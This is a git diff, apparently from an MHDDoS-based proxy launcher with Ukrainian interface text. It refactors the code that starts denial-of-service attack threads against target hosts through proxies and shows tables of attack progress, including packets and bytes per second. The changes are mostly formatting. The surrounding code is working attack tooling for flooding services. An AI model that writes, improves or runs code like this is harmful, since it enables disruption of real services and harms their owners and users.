@@ -2,17 +2,16 @@ import argparse
 import os
 import random
 import socket
-import sys
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from functools import lru_cache
 from multiprocessing import cpu_count
 from threading import Thread
+from time import sleep, time
 
 import requests
 from PyRoxy import Proxy
-from yarl import URL
 from tabulate import tabulate
-from time import sleep, time
+from yarl import URL
 
 from mhddos.start import logger, Methods, bcolors as cl, main as mhddos_main
 
@@ -25,8 +24,10 @@ LOW_RPC = 1000
 THREADS_PER_CORE = 1000
 MAX_DEFAULT_THREADS = 4000
 
+
 def cls():
-    os.system('cls' if os.name=='nt' else 'clear')
+    os.system('cls' if os.name == 'nt' else 'clear')
+
 
 @lru_cache(maxsize=128)
 def resolve_host(url):
@@ -124,7 +125,6 @@ def update_proxies(period, targets):
         for proxy in CheckedProxies:
             wr.write(str(proxy) + '\n')
 
-text_to_print = []
 
 def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug, table):
     threads_per_target = total_threads // len(targets)
@@ -147,27 +147,38 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug,
                 params_list.append([method, target, ip, threads, period, proxy_file, rpc])
 
     logger.info(f'{cl.OKGREEN}Запускаємо атаку...{cl.RESET}')
-
+    text_to_print = [] if table else None
     for params in params_list:
-        Thread(target=mhddos_main, args=params, kwargs={'debug': debug, 'text_to_print': text_to_print, 'table': table}, daemon=True).start()
+        kwargs = {'debug': debug, 'text_to_print': text_to_print}
+        Thread(target=mhddos_main, args=params, kwargs=kwargs, daemon=True).start()
 
     if table:
         tabulate_text_targets = []
         for params in params_list:
             tabulate_text_targets.append((f'{cl.WARNING}%s' % params[1], params[0], f'%s{cl.RESET}' % params[3]))
-        
-        print(tabulate(tabulate_text_targets, headers=[f'{cl.OKBLUE}Атакуємо','Методом',f'Потоків{cl.RESET}'], tablefmt='fancy_grid'))
 
-        ts = time()       
+        print(tabulate(
+            tabulate_text_targets,
+            headers=[f'{cl.OKBLUE}Атакуємо', 'Методом', f'Потоків{cl.RESET}'],
+            tablefmt='fancy_grid'
+        ))
+
+        ts = time()
         while time() < ts + period:
-            sleep(5)
-            cls()        
+            sleep(3)
+            cls()
             tabulate_text_progress = []
 
             for text in text_to_print:
                 row = text.split(',')
-                tabulate_text_progress.append((f'{cl.WARNING}%s' % row[0], row[1], row[2], row[3], row[4], row[5], f'%s{cl.RESET}' % row[6]))
-            print(tabulate(tabulate_text_progress, headers=[f'{cl.OKBLUE}Ціль','Порт','Метод','Потоків','PPS','BPS',f'Прогрес{cl.RESET}'], tablefmt='fancy_grid'))
+                tabulate_text_progress.append(
+                    (f'{cl.WARNING}%s' % row[0], row[1], row[2], row[3], row[4], row[5], f'%s{cl.RESET}' % row[6])
+                )
+            print(tabulate(
+                tabulate_text_progress,
+                headers=[f'{cl.OKBLUE}Ціль', 'Порт', 'Метод', 'Потоків', 'PPS', 'BPS', f'Прогрес{cl.RESET}'],
+                tablefmt='fancy_grid'
+            ))
 
             tabulate_text_progress.clear()
             text_to_print.clear()
